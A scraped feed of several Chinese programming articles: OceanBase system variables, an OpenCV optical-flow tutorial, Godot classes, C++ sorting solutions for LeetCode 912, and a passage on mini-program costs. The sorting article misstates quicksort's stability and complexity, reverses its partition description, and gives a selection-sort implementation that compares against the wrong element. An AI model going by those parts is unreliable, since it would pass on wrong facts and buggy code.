ob_system_variable_init.json涉及到的字段
base_value 和 default_value
这里存在两个value，一个是default_value， 一个是base_value。第一次申请新增变量时，两个值是相同的，如果后面新版本需要修改默认值时，只需要修改default_value即可，base_value仅作为基线不会再被修改。
data_type
变量的数据类型，包括int、uint、varchar、enum、bool。
on_check_and_convert_func
对此变量的校验方法，需要在ob_system_variable.cpp中去实现对这个变量的校验与转换。
例：
"ob_query_timeout": {"id": 10005,"name": "ob_query_timeout","default_value": "10000000","base_value": "10000000","data_type": "int","info": "Query timeout in microsecond(us)","flags": "GLOBAL | SESSION | NEED_SERIALIZE","on_check_and_convert_func": "ObSysVarOnCheckFuncs::check_and_convert_timeout_too_large","publish_version": "","info_cn": "","background_cn": "","ref_url": ""
}//ObSysVarOnCheckFuncs::check_and_convert_timeout_too_large 将对ob_query_timeout进行限制
enum_names
限制该变量的可选项
例子：enum_names 限制了mysql租户还是oracle租户类型
"ob_compatibility_mode": {"id": 10030,"name": "ob_compatibility_mode","default_value": "0","base_value": "0","data_type": "enum","info": "What DBMS is OceanBase compatible with? MYSQL means it behaves like MySQL while ORACLE means it behaves like Oracle.","flags": "GLOBAL | SESSION | READONLY | WITH_UPGRADE | NEED_SERIALIZE","enum_names": ["MYSQL","ORACLE"],"publish_version": "","info_cn": "","background_cn": "","ref_url": ""
},
​
flags
变量的标记，记录这个变量的特性。
GLOBAL 租户全局生效
SESSION sesssion生效
NEED_SERIALIZE 需要序列化到远端（涉及远程、分布式执行计划）
INFLUENCE_PLAN 变量的改变是否清空相关的Plan cache。
INVISIBLE 隐藏变量
READONLY 变量只读，不可更改
SESSION_READONLY session级别只读，global级别可更改
WITH_UPGRADE 只有ob_compatibility_mode有此flag，用来区别其他READONLY的变量。
NULL  只有字符类型相关的变量才具有的flag，作用未知。
生成新增系统变量
执行gen_ob_sys_variables.py后，如下的工程文件发生了变化。受影响的工程文件如下图所示，这些文件会被底层一套复杂的分布式session管理模块所调用。
重新编译后，show variables可以看到成功添加了新的变量。
系统变量的使用
变量的调用是 基于ObBasicSessionInfo这个类实现的，需要为其实现一个方法，以便其他逻辑通过session对象获取系统变量。
ObBasicSessionInfo存储系统变量及其相关变量，并存储远程执行SQL任务时需要序列化到远端的状态信息，例如上面提到的ob_query_timeout这个需要序列化的变量。
ObSQLSessionInfo是ObBasicSessionInfo的一个子类，存储其他状态信息，如prepared statment相关信息等。
使用的话需要在ObBasicSessionInfo中定义一个获取变量的方法，例：
class ObBasicSessionInfo
{ ...public:int get_query_timeout(int64_t &amp;query_timeout) const{query_timeout = sys_vars_cache_.get_ob_query_timeout();return common::OB_SUCCESS;}......int ObBasicSessionInfo::get_enable_parallel_dml(bool &amp;v) const{return get_bool_sys_var(SYS_VAR__ENABLE_PARALLEL_DML, v);}...
}
get_query_timeout这个方法内的sys_vars_cache有一个成员对象SysVarsCacheData，它是ObBasicSessionInfo的内部缓存以提升性能，部分经常被使用到的变量就会加入到缓存中，如ob_query_timeout，该变量会提前初始化到内存中。而大部分的系统变量还是基于sys_vars_存储的，如get_enable_parallel_dml这个方法底层还是从sys_vars_中获取变量。
class ObBasicSessionInfo
{ 
​    ...class SysVarsCache{...public:SysVarsCacheData inc_data_;...}...private:SysVarsCache sys_vars_cache_;...private:share::ObBasicSysVar *sys_vars_[share::ObSysVarFactory::ALL_SYS_VARS_COUNT];...
}
调用变量例子：
int ObMPQuery::process()
{
...
ObSQLSessionInfo &amp;session = *sess;
...
else if (OB_FAIL(session.get_query_timeout(query_timeout))) {
LOG_WARN("fail to get query timeout", K_(sql), K(ret));
...
}</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540197.html</guid><pubDate>Fri, 31 Oct 2025 07:28:03 +0000</pubDate></item><item><title>通过OpenCV实现 Lucas-Kanade 算法</title><link>https://www.ppmy.cn/news/1540198.html</link><description>目录
简介
Lucas-Kanade 光流算法
实现步骤
1. 导入所需库
2. 视频捕捉与初始化
3. 设置特征点参数
4. 创建掩模
5. 光流估计循环
6. 释放资源
结论
简介
在计算机视觉领域，光流估计是一种追踪物体运动的技术。它通过比较连续帧之间的像素强度变化来估计图像中每个像素的移动。本文将通过一个实际例子，使用Python和OpenCV库来展示光流估计的概念，特别是Lucas-Kanade光流算法的实现。
光流估计的核心思想是假设一个像素在连续帧之间的移动不会改变其亮度。这个假设允许我们通过比较相邻帧中像素的亮度变化来计算其运动速度。在视频处理中，这种技术可以用于追踪物体的运动、分析运动模式等。
Lucas-Kanade 光流算法
Lucas-Kanade 光流算法是一种基于窗口的光流估计方法。它假设在一个小的局部窗口内，所有像素的运动都是相同的。这个算法简单而高效，适合用于实时视频处理。
实现步骤
1. 导入所需库
首先，导入必要的库：
import numpy as np
import cv2
2. 视频捕捉与初始化
接下来，打开视频文件，读取第一帧，并将其转换为灰度图像：
cap = cv2.VideoCapture('test.avi')
color = np.random.randint(0, 255, (100, 3))
ret, old_frame = cap.read()
old_gray = cv2.cvtColor(old_frame, cv2.COLOR_BGR2GRAY)
3. 设置特征点参数
定义检测特征点的参数，例如最大角点数量、质量阈值和最小距离：
feature_params = dict(maxCorners=100,qualityLevel=0.3,minDistance=7)
p0 = cv2.goodFeaturesToTrack(old_gray, mask=None, **feature_params)
4. 创建掩模
创建一个与当前帧大小相同的掩模，用于绘制轨迹：
mask = np.zeros_like(old_frame)
5. 光流估计循环
进入一个循环，读取每一帧，使用Lucas-Kanade算法计算特征点的光流，并在图像上绘制轨迹：
lk_params = dict(winSize=(15, 15), maxLevel=2)
while (True):ret, frame = cap.read()if not ret:breakframe_gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)p1, st, err = cv2.calcOpticalFlowPyrLK(old_gray, frame_gray, p0, None, **lk_params)good_new = p1[st == 1]good_old = p0[st == 1]for i, (new, old) in enumerate(zip(good_new, good_old)):a, b = new.ravel()c, d = old.ravel()a, b, c, d = int(a), int(b), int(c), int(d)mask = cv2.line(mask, (a, b), (c, d), color[i].tolist(), 2)cv2.imshow('mask', mask)img = cv2.add(frame, mask)cv2.imshow('frame', img)k = cv2.waitKey(150) &amp; 0xffif k == 27:breakold_gray = frame_gray.copy()p0 = good_new.reshape(-1, 1, 2)
6. 释放资源
最后，当用户按下ESC键时，释放所有资源：
cv2.destroyAllWindows()
cap.release()
7.结果展示
结论
通过上述代码，我们成功地使用OpenCV实现了Lucas-Kanade光流算法，可以追踪视频中的特征点。光流估计在许多计算机视觉应用中都是非常有用的技术，如目标追踪、动作识别和图像稳定性控制等。
如果你对光流估计和Lucas-Kanade算法有更深入的兴趣，可以尝试调整参数，比如窗口大小、最小距离等，来观察对追踪结果的影响。此外，也可以尝试应用光流估计到不同的视频和场景中，以了解其适用性和限制。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540198.html</guid><pubDate>Fri, 31 Oct 2025 07:28:06 +0000</pubDate></item><item><title>Godot中类和静态类型</title><link>https://www.ppmy.cn/news/1540199.html</link><description>目录
类
关键字class_name
除了为类定义方法，我们也可以为类定义属性字段
实例释放前后的打印
Refcounted
RefCounted维护了一个引用计数器
get_reference_count
类是引用类型数据
class关键字
静态类型
静态方法
静态方法只能访问静态变量
类
是面向对象编程的最基础的概念，是计算机程序实现数据信息封装的基础
Godot大部分内容都继承于Object，而Object就是Godot中基础的类，如果不写extends来指定继承哪个类，默认继承于Object
我们自定义的类最终都要继承于Object
关键字class_name
可以定义一个全局类，全局类在Godot代码中的任意部分都可以访问
&lt;类名&gt;.成员名，访问成员
类相当于我们自己定义的一种变量类型
&lt;类名&gt;.new()创建出一个类实例
继承于Object类的实例就像一个游戏物体，被创建出来要释放删除，否则一直存在于内存中
除了为类定义方法，我们也可以为类定义属性字段
属性就是类内部的变量，用于存储数据
实例释放前后的打印
实例释放前，输出文本Object和数字，后面的数字就是实例的唯一ID,Godot中所有类都有一个唯一ID
实例释放后，输出Freed Object
Refcounted
我们通过调用free函数实现删除实例，这个free函数就是Godot中的Object类提供的一个函数
Object默认不会自动释放，需要我们在用不到这个实例之后手动调用free函数
我们将类继承于RefCounted这个类
RefCounted同样继承于Object类，只不过这个类的内存是交给Godot管理的，在RefCounted检查到自身引用为0的时候，就会自动释放自身
继承于RefCounted的类也会有一样的特点
这里的my_class就是一个对实例的引用当_ready函数执行结束后，my_class这个变量会被Godot释放，同时这个变量所引用的Myclass实例的引用计数-1
当引用计数归0时，Godot会立刻删除这个实例对象
RefCounted维护了一个引用计数器
由于Object是一个引用类型的数据，我们定义的变量持有的只是一个内存地址
这个地址才是类实例数据存放的位置，RefCounted就是检查程序中有多少个变量引用了当前自身这个地址
get_reference_count
通过get_reference_count检查当前实例有多少个引用
因为没有任何变量引用实例的地址就再也访问不到程序的内存了，所以RefCounted会认为当前实例已经用不到了，随后就会释放自身
这里的my_class就是对类实例的一个引用，返回1，也就是说整个程序只有一个对这个实例的引用
定义一个新变量，内容为my_class，这时这个新变量也成了对这个实例的一个引用
最后，将ref_my_class的值改为null，也就是这个变量不再存储对这个实例的引用，引用计数就会-1
类是引用类型数据
类的实例是一个引用类型数据，引用类型数据的特点就是变量存储的，不是数据的实际内容，而是程序内存中的一个地址
这个地址指向了类实例的实际数据存储的位置
声明一个新变量my_class2，它的值为my_class，实际上，就是my_class2保存的内容变得和my_class一样
my_class实际上保存的是一个地址，这个地址是我们使用Nuew函数实例化出来的类实例
所以最后，my_class和my_class2存储的都是这个类实例的内存地址
我们修改my_class中的id值为100，然后点打印，这个id值是我们刚刚在全局类Myclass中声明的一个整数属性字段
在下面，我们又声明了my_class2，它的值为my_class，我们修改my_class2的id属性，输出后发现，my_class2的改动影响了my_class
这也证明了实际我们的my_classs是全局类的Myclass实例的一个地址， 在定义my_class2时，只不过将同一地址赋值进去
多个变量指向同一个类实例对象，所以对my_class2的修改也会影响到my_class
class关键字
我们通过class_name定义的是全局类，全局类在Godot整个项目内都可以通过代码实例化
而我们可以通过class关键字，来定义一个内部类
内部类只有当前定义部类的脚本中才可以实例化
class后面加上类的名称，内部类默认继承于Object
同样可以使用extends关键字来指定这个内部类继承于哪个父类
内部类的代码作用域和脚本的作用域不同，是两个独立的作用域，因此内部类无法访问脚本中的全局变量
静态类型
静态变量使用static关键字，在定义变量的var关键字之前对其修饰，Godot就会将变量声明为静态变量
静态变量就是程序运行期间，保持其存在和值的变量
即，静态变量的值是所有类实例统一的
我们用new关键字实例化创建两个类的实例，这两个实例都是独立的
最后输出的内容是两个不同的数值，表明两个类实例独立
将num改成静态变量cnt
最后输出同样的值，也就是我们最后赋值的内容
对静态变量的修改，影响是全局的
静态方法
在func关键字前加上static修饰符，可以声明一个静态方法
我们可以直接通过类名访问静态变量或静态方法
无法访问非静态变量
因为如果我们不实例化，这个非静态变量数据是不存在于程序内存中的
而静态变量在程序初始化时就被创建了，因此无须我们手动实例入这个类的实例
可以根据这种特性制作一些工具类
静态方法只能访问静态变量
由于静态方法可以在不实例化时调用，所以静态方法只能访问静态变量
如果类没有实例化，非静态变量是不存在于程序内存的，所以为了避免错误，静态方法就无法访问非静态变量
这里的user_name2是一个非静态变量，如果以为要对其进行修改，无法在静态方法string_add中操作</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540199.html</guid><pubDate>Fri, 31 Oct 2025 07:28:08 +0000</pubDate></item><item><title>刷题 排序算法</title><link>https://www.ppmy.cn/news/1540200.html</link><description>912. 排序数组
注意这道题目所有
O(n^2)
复杂度的算法都会超过时间限制，只有
O(nlogn)
的可以通过
快速排序空间复杂度为
O(logn)
是由于
递归的栈的调用
归并排序空间复杂度为
O(n)
是由于需要一个
临时数组
(当然也需要栈的调用，但是
O(logn)
&lt;
O(n)
的忽略了)
除了上表列出的结果之外，还包括桶排序，桶排序包括三种：
基数排序：根据键值的每位数字来分配桶；
计数排序：每个桶只存储单一键值；
桶排序：每个桶存储一定范围的数值。
基于插入的排序算法
直接插入排序
类似于打扑克牌的操作 直接插入排序(算法过程, 效率分析, 稳定性分析)
时间复杂度：最好情况
O(n)
, 最坏情况
O(n^2)
空间复杂度：
O(1)
稳定性：是稳定的
class
Solution
{
public
:
vector
&lt;
int
&gt;
sortArray
(
vector
&lt;
int
&gt;
&amp;
nums
)
{
// 插入排序
for
(
int
i
=
1
;
i
&lt;
nums
.
size
(
)
;
++
i
)
{
int
cur_val
=
nums
[
i
]
;
int
j
=
i
-
1
;
while
(
j
&gt;=
0
&amp;&amp;
nums
[
j
]
&gt;
cur_val
)
{
// 寻找插入位置
nums
[
j
+
1
]
=
nums
[
j
]
;
--
j
;
}
nums
[
j
+
1
]
=
cur_val
;
}
return
nums
;
}
}
;
折半插入排序
直接插入排序是使用
顺序查找的方法，从后往前寻找插入的位置
同理我们也可以使用
二分查找
的方式来
寻找插入的位置
折半查找
减少了比较的次数
，将比较操作的时间复杂度降低为
O(logn)
，但
没有减少移动的次数
，整体时间复杂度还是
O(n^2)
时间复杂度：最好情况
O(n)
, 最坏情况
O(n^2)
空间复杂度：
O(1)
稳定性：是稳定的
class
Solution
{
public
:
int
binarySearch
(
vector
&lt;
int
&gt;
nums
,
int
right
,
int
target
)
{
// 找到第一个大于 target 的值
int
left
=
0
;
// 使用左闭右闭区间
while
(
left
&lt;=
right
)
{
// 区间不为空
int
mid
=
left
+
(
right
-
left
)
/
2
;
// 循环不变量
// nums[left - 1] &lt;= target
// nums[right + 1] &gt; target
if
(
nums
[
mid
]
&lt;=
target
)
{
left
=
mid
+
1
;
}
else
if
(
nums
[
mid
]
&gt;
target
)
{
right
=
mid
-
1
;
}
}
return
left
;
}
vector
&lt;
int
&gt;
sortArray
(
vector
&lt;
int
&gt;
&amp;
nums
)
{
// 折半插入排序
for
(
int
i
=
1
;
i
&lt;
nums
.
size
(
)
;
++
i
)
{
int
cur_val
=
nums
[
i
]
;
int
insert_pos
=
binarySearch
(
nums
,
i
-
1
,
cur_val
)
;
for
(
int
j
=
i
-
1
;
j
&gt;=
insert_pos
;
--
j
)
{
nums
[
j
+
1
]
=
nums
[
j
]
;
}
nums
[
insert_pos
]
=
cur_val
;
}
return
nums
;
}
}
;
希尔排序 - 插入排序的改进 - 缩小增量排序
插入排序在序列基本
有序
时效率较高
基于这个特点，希尔排序就是对数组分组进行插入排序，分组的组数就是
d
，也即增量，一种简单的增量序列就是从
num.size() / 2
开始，一直缩小到
1
，当然也可以采用其他的增量序列
时间复杂度：最好情况
O(n)
, 最坏情况
O(n^2)
，平均复杂度
O(n^1.3)
(了解即可)
空间复杂度：
O(1)
稳定性：不稳定的
class
Solution
{
public
:
vector
&lt;
int
&gt;
sortArray
(
vector
&lt;
int
&gt;
&amp;
nums
)
{
for
(
int
d
=
nums
.
size
(
)
/
2
;
d
&gt;=
1
;
--
d
)
{
// 分组插入排序
for
(
int
k
=
0
;
k
&lt;
d
;
++
k
)
{
// 组内进行插入排序
for
(
int
i
=
k
+
d
;
i
&lt;
nums
.
size
(
)
;
i
+=
d
)
{
int
cur_val
=
nums
[
i
]
;
int
j
=
i
-
d
;
while
(
j
&gt;=
0
&amp;&amp;
nums
[
j
]
&gt;
cur_val
)
{
nums
[
j
+
d
]
=
nums
[
j
]
;
j
-=
d
;
}
nums
[
j
+
d
]
=
cur_val
;
}
}
}
return
nums
;
}
}
;
基于交换的排序算法
冒泡排序
时间复杂度：最好情况
O(n)
, 最坏情况
O(n^2)
空间复杂度：
O(1)
稳定性：稳定
class
Solution
{
public
:
vector
&lt;
int
&gt;
sortArray
(
vector
&lt;
int
&gt;
&amp;
nums
)
{
// 冒泡排序
for
(
int
i
=
nums
.
size
(
)
-
1
;
i
&gt;=
1
;
--
i
)
{
bool
swapped
=
false
;
for
(
int
j
=
0
;
j
&lt;
i
;
++
j
)
{
if
(
nums
[
j
]
&gt;
nums
[
j
+
1
]
)
{
swap
(
nums
[
j
]
,
nums
[
j
+
1
]
)
;
swapped
=
true
;
}
}
if
(
!
swapped
)
{
// 没有发生交换，说明代码已经有序
break
;
}
}
return
nums
;
}
}
;
快速排序 图解 - 分治法
步骤：
随机选取一个位置 nums[i] = x
将大于 x 的值都移到 nums[i] 的左边，小于 x 的值都移动到 nums[i] 的右边
对 nums[0 ~i -1] 和 nums[i + 1 ~ n -1] 分别进行快速排序
…
步骤中的核心问题：如何
将大于 x 的值都移到 nums[i] 的左边，小于 x 的值都移动到 nums[i] 的右边
?
时间复杂度：最好情况
O(n)
, 最坏情况
O(n^2)
空间复杂度：
O(1)
稳定性：稳定
class
Solution
{
public
:
void
quickSort
(
vector
&lt;
int
&gt;
&amp;
nums
,
int
left
,
int
right
)
{
if
(
left
&gt;=
right
)
return
;
// 递归终止条件
int
p
=
partition
(
nums
,
left
,
right
)
;
quickSort
(
nums
,
left
,
p
-
1
)
;
quickSort
(
nums
,
p
+
1
,
right
)
;
}
int
partition
(
vector
&lt;
int
&gt;
&amp;
nums
,
int
left
,
int
right
)
{
int
p
=
left
+
rand
(
)
%
(
right
-
left
+
1
)
;
// 生成 [left ~ right] 区间内的随机数
swap
(
nums
[
p
]
,
nums
[
right
]
)
;
// 将 pivot 和末尾值交换
int
i
=
left
;
// 维护的区间： [left, i) 区间内的值小于等于 nums[right]
// [j, right) 区间内的值大于 nums[right]
for
(
int
j
=
left
;
j
&lt;
right
;
++
j
)
{
if
(
nums
[
j
]
&lt;=
nums
[
right
]
)
{
// 此时不满足我们对区间的要求了
// 调整区间使其满足要求
// {nums[left] ... nums[i-1]} {[nums[i] ... nums[j]]}
swap
(
nums
[
i
]
,
nums
[
j
]
)
;
++
i
;
// --&gt; {nums[left] ... nums[i-1] nums[j]} { ... nums[i]]}
}
}
swap
(
nums
[
i
]
,
nums
[
right
]
)
;
return
i
;
}
vector
&lt;
int
&gt;
sortArray
(
vector
&lt;
int
&gt;
&amp;
nums
)
{
srand
(
time
(
0
)
)
;
// 以当前时间为随机数种子
quickSort
(
nums
,
0
,
nums
.
size
(
)
-
1
)
;
return
nums
;
}
}
;
但是上面这段代码提交还是会超过时间限制，由于当前的快速排序在处理包含大量相同元素的数组时，表现不佳。快速排序在最坏情况下的时间复杂度是
O(n^2)
使用三向切分的快速排序
三向切分是对标准快速排序的一种改进，特别适用于处理大量重复元素的情况。它将数组分为三个部分：
小于基准的部分
等于基准的部分
大于基准的部分
通过三向切分，可以避免在处理大量重复元素时退化为 O(n²)，使得时间复杂度保持在 O(n log n)。
class
Solution
{
public
:
void
quickSort3Way
(
vector
&lt;
int
&gt;
&amp;
nums
,
int
left
,
int
right
)
{
if
(
left
&gt;=
right
)
return
;
// 递归终止条件
int
pivot
=
nums
[
left
+
rand
(
)
%
(
right
-
left
+
1
)
]
;
// 选取随机基准
int
lt
=
left
,
i
=
left
,
gt
=
right
;
// 初始化 lt、i、gt 指针
// [left ~ lt) 小于 pivot
// [lt, gt] 等于 pivot
// [gt + 1, right] 大于 pivot
while
(
i
&lt;=
gt
)
{
if
(
nums
[
i
]
&lt;
pivot
)
{
swap
(
nums
[
lt
]
,
nums
[
i
]
)
;
++
lt
;
++
i
;
}
else
if
(
nums
[
i
]
&gt;
pivot
)
{
swap
(
nums
[
i
]
,
nums
[
gt
]
)
;
--
gt
;
// 不能++i，因为换下来的这个数的值还没有跟 pivot 比较过
}
else
{
++
i
;
}
}
// 递归处理小于和大于基准的部分
quickSort3Way
(
nums
,
left
,
lt
-
1
)
;
quickSort3Way
(
nums
,
gt
+
1
,
right
)
;
}
vector
&lt;
int
&gt;
sortArray
(
vector
&lt;
int
&gt;
&amp;
nums
)
{
srand
(
time
(
0
)
)
;
// 只需初始化一次随机数种子
quickSort3Way
(
nums
,
0
,
nums
.
size
(
)
-
1
)
;
return
nums
;
}
}
;
选择排序
简单选择排序
时间复杂度：最好情况
O(n)
, 最坏情况
O(n^2)
空间复杂度：
O(1)
稳定性：不稳定
不稳定性分析：
假设有一个数组 [4a, 2, 4b, 3]，其中 4a 和 4b 是两个相同值的元素，但具有不同的初始顺序。
第一轮：选择 2 作为最小元素，然后与 4a 交换，数组变为 [
2
,
4a
, 4b, 3]。
第二轮：选择 3 作为最小元素，然后与 4a 交换，数组变为 [2,
3
, 4b,
4a
]。 注意此时 4a 和 4b 的相对顺序已经被改变：原本 4a 在 4b 之前，现在 4a被排在了 4b 之后。
因此，选择排序是不稳定的，因为它改变了相同值元素的初始顺序。
class
Solution
{
public
:
vector
&lt;
int
&gt;
sortArray
(
vector
&lt;
int
&gt;
&amp;
nums
)
{
// 选择排序
for
(
int
i
=
0
;
i
&lt;
nums
.
size
(
)
-
1
;
++
i
)
{
int
min_idx
=
i
;
for
(
int
j
=
i
+
1
;
j
&lt;
nums
.
size
(
)
;
++
j
)
{
if
(
nums
[
j
]
&lt;
nums
[
i
]
)
{
min_idx
=
j
;
// 最小值的索引
}
}
swap
(
nums
[
i
]
,
nums
[
min_idx
]
)
;
// 和最小值进行交换
}
return
nums
;
}
}
;
堆排序 - 堆 - 完全二叉树 - 顺序存储
class
Solution
{
public
:
// 堆化函数：调整以 i 为根的子树，n 为堆的大小
void
heapify
(
vector
&lt;
int
&gt;
&amp;
nums
,
int
n
,
int
i
)
{
int
largest
=
i
;
// 初始化为根节点
int
left
=
2
*
i
+
1
;
// 左孩子
int
right
=
2
*
i
+
2
;
// 右孩子
// 如果左孩子比根节点大
if
(
left
&lt;
n
&amp;&amp;
nums
[
left
]
&gt;
nums
[
largest
]
)
{
largest
=
left
;
}
// 如果右孩子比当前最大值还大
if
(
right
&lt;
n
&amp;&amp;
nums
[
right
]
&gt;
nums
[
largest
]
)
{
largest
=
right
;
}
// 如果最大值不是根节点，交换并继续堆化
if
(
largest
!=
i
)
{
swap
(
nums
[
i
]
,
nums
[
largest
]
)
;
// 递归对受影响的子树进行堆化
heapify
(
nums
,
n
,
largest
)
;
}
}
vector
&lt;
int
&gt;
sortArray
(
vector
&lt;
int
&gt;
&amp;
nums
)
{
int
n
=
nums
.
size
(
)
;
// 从最后一个非叶子节点开始建堆，调整整个堆
for
(
int
i
=
n
/
2
-
1
;
i
&gt;=
0
;
--
i
)
{
heapify
(
nums
,
n
,
i
)
;
}
// 逐一将堆顶元素与末尾元素交换，并重新调整堆
for
(
int
i
=
n
-
1
;
i
&gt;
0
;
--
i
)
{
// 将当前堆顶（最大值）与末尾元素交换
swap
(
nums
[
0
]
,
nums
[
i
]
)
;
// 重新对剩下的部分进行堆化
heapify
(
nums
,
i
,
0
)
;
}
return
nums
;
}
}
;
归并排序
可以将排序问题分解成 将左半边排序 + 将右半边排序 + 合并左右两侧
时间复杂度：
O(n log n)
空间复杂度：
O(n) （源于临时数组）
稳定性：稳定
class
Solution
{
public
:
void
mergeArray
(
vector
&lt;
int
&gt;
&amp;
nums
,
vector
&lt;
int
&gt;
&amp;
tmp
,
int
left
,
int
right
)
{
if
(
right
==
left
)
return
;
// 递归终止条件
int
mid
=
left
+
(
right
-
left
)
/
2
;
mergeArray
(
nums
,
tmp
,
left
,
mid
)
;
// 对左半边进行排序
mergeArray
(
nums
,
tmp
,
mid
+
1
,
right
)
;
// 对右半边进行排序
// 重要优化：如果左右两部分已经有序，可以跳过合并
if
(
nums
[
mid
]
&lt;=
nums
[
mid
+
1
]
)
return
;
// 左右两侧均已完成排序，对二者进行合并
int
i
=
left
,
j
=
mid
+
1
,
k
=
left
;
while
(
i
&lt;=
mid
&amp;&amp;
j
&lt;=
right
)
{
if
(
nums
[
i
]
&lt;=
nums
[
j
]
)
{
tmp
[
k
++
]
=
nums
[
i
++
]
;
}
else
{
tmp
[
k
++
]
=
nums
[
j
++
]
;
}
}
while
(
i
&lt;=
mid
)
{
tmp
[
k
++
]
=
nums
[
i
++
]
;
}
while
(
j
&lt;=
right
)
{
tmp
[
k
++
]
=
nums
[
j
++
]
;
}
copy
(
tmp
.
begin
(
)
+
left
,
tmp
.
begin
(
)
+
right
+
1
,
nums
.
begin
(
)
+
left
)
;
}
vector
&lt;
int
&gt;
sortArray
(
vector
&lt;
int
&gt;
&amp;
nums
)
{
vector
&lt;
int
&gt;
tmp
(
nums
.
size
(
)
,
0
)
;
mergeArray
(
nums
,
tmp
,
0
,
nums
.
size
(
)
-
1
)
;
return
nums
;
}
}
;
桶排序
桶排序
class
Solution
{
public
:
vector
&lt;
int
&gt;
sortArray
(
vector
&lt;
int
&gt;
&amp;
nums
)
{
if
(
nums
.
empty
(
)
)
{
return
nums
;
}
// 找到数组中的最大值和最小值，用于确定桶的范围
int
minVal
=
*
min_element
(
nums
.
begin
(
)
,
nums
.
end
(
)
)
;
int
maxVal
=
*
max_element
(
nums
.
begin
(
)
,
nums
.
end
(
)
)
;
// 桶的数量，选择合适的数量，通常是nums.size()
int
bucketCount
=
nums
.
size
(
)
;
// 创建桶，桶是一个二维向量，每个桶都是一个向量
vector
&lt;
vector
&lt;
int
&gt;&gt;
buckets
(
bucketCount
)
;
// 分配元素到对应的桶
for
(
int
num
:
nums
)
{
// 根据元素的值分配到对应的桶
int
bucketIndex
=
(
num
-
minVal
)
*
(
bucketCount
-
1
)
/
(
maxVal
-
minVal
)
;
buckets
[
bucketIndex
]
.
push_back
(
num
)
;
}
// 对每个桶进行单独排序
for
(
int
i
=
0
;
i
&lt;
bucketCount
;
i
++
)
{
sort
(
buckets
[
i
]
.
begin
(
)
,
buckets
[
i
]
.
end
(
)
)
;
}
// 将所有桶中的元素合并回结果数组
vector
&lt;
int
&gt;
sortedArray
;
for
(
const
auto
&amp;
bucket
:
buckets
)
{
sortedArray
.
insert
(
sortedArray
.
end
(
)
,
bucket
.
begin
(
)
,
bucket
.
end
(
)
)
;
}
return
sortedArray
;
}
}
;
计数排序
class
Solution
{
public
:
vector
&lt;
int
&gt;
sortArray
(
vector
&lt;
int
&gt;
&amp;
nums
)
{
if
(
nums
.
empty
(
)
)
{
return
nums
;
}
// 找到数组中的最大值和最小值
int
minVal
=
*
min_element
(
nums
.
begin
(
)
,
nums
.
end
(
)
)
;
int
maxVal
=
*
max_element
(
nums
.
begin
(
)
,
nums
.
end
(
)
)
;
// 创建计数数组，大小为 (maxVal - minVal + 1)
int
range
=
maxVal
-
minVal
+
1
;
vector
&lt;
int
&gt;
count
(
range
,
0
)
;
// 计数每个元素出现的次数
for
(
int
num
:
nums
)
{
count
[
num
-
minVal
]
++
;
}
// 根据计数数组构造排序后的数组
vector
&lt;
int
&gt;
sortedArray
;
for
(
int
i
=
0
;
i
&lt;
range
;
i
++
)
{
while
(
count
[
i
]
&gt;
0
)
{
sortedArray
.
push_back
(
i
+
minVal
)
;
count
[
i
]
--
;
}
}
return
sortedArray
;
}
}
;
基数排序
class
Solution
{
public
:
// 基数排序的主函数
vector
&lt;
int
&gt;
sortArray
(
vector
&lt;
int
&gt;
&amp;
nums
)
{
if
(
nums
.
empty
(
)
)
{
return
nums
;
}
// 找到数组中的最大值，确定最大位数
int
maxVal
=
*
max_element
(
nums
.
begin
(
)
,
nums
.
end
(
)
)
;
// 从最低位开始，对每个位进行排序
for
(
int
exp
=
1
;
maxVal
/
exp
&gt;
0
;
exp
*=
10
)
{
countingSortByDigit
(
nums
,
exp
)
;
}
return
nums
;
}
private
:
// 按照数字的某一位进行计数排序
void
countingSortByDigit
(
vector
&lt;
int
&gt;
&amp;
nums
,
int
exp
)
{
int
n
=
nums
.
size
(
)
;
vector
&lt;
int
&gt;
output
(
n
)
;
// 临时数组存储排序结果
vector
&lt;
int
&gt;
count
(
10
,
0
)
;
// 计数数组，大小为10，因为数字位有0到9
// 根据当前位 (exp) 统计每个数字出现的次数
for
(
int
i
=
0
;
i
&lt;
n
;
i
++
)
{
int
digit
=
(
nums
[
i
]
/
exp
)
%
10
;
count
[
digit
]
++
;
}
// 计算每个数字的累积计数，用于确定数字的最终位置
for
(
int
i
=
1
;
i
&lt;
10
;
i
++
)
{
count
[
i
]
+=
count
[
i
-
1
]
;
}
// 根据计数数组，将数字放入正确的位置
for
(
int
i
=
n
-
1
;
i
&gt;=
0
;
i
--
)
{
int
digit
=
(
nums
[
i
]
/
exp
)
%
10
;
output
[
count
[
digit
]
-
1
]
=
nums
[
i
]
;
count
[
digit
]
--
;
}
// 将排序后的数组复制回原数组
for
(
int
i
=
0
;
i
&lt;
n
;
i
++
)
{
nums
[
i
]
=
output
[
i
]
;
}
}
}
;</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540200.html</guid><pubDate>Fri, 31 Oct 2025 07:28:10 +0000</pubDate></item><item><title>开发一个微信小程序要多少钱？</title><link>https://www.ppmy.cn/news/1540201.html</link><description>在当今数字化时代，微信小程序成为众多企业和个人拓展业务、提供服务的热门选择。那么，开发一个微信小程序究竟需要多少钱呢？
开发成本主要取决于多个因素。首先是功能需求的复杂程度。如果只是一个简单的信息展示小程序，功能仅限于文字、图片展示和基本的导航，开发成本相对较低，可能在数千元左右。这种小程序开发难度较小，所需的开发时间也较短。
然而，如果需要开发具有复杂功能的小程序，如电商平台、在线教育、社交互动等，成本则会大幅上升。电商小程序需要具备商品展示、购物车、支付系统、订单管理等功能，开发费用可能在几万元甚至更高。在线教育小程序可能需要直播、课程管理、作业提交等功能，其开发成本也不低。
其次，设计要求也会影响价格。一个精美的界面设计能够提升用户体验，但同时也需要更多的设计时间和精力。如果对小程序的界面设计有较高的要求，如定制化的图标、独特的色彩搭配、流畅的动画效果等，那么设计费用也会相应增加。
另外，开发团队的选择也很重要。不同的开发团队收费标准不同。专业的开发公司通常收费较高，但他们拥有丰富的经验和专业的技术团队，能够保证小程序的质量和稳定性。而一些小型的开发团队或个人开发者可能收费较低，但在质量和售后方面可能存在一定风险。
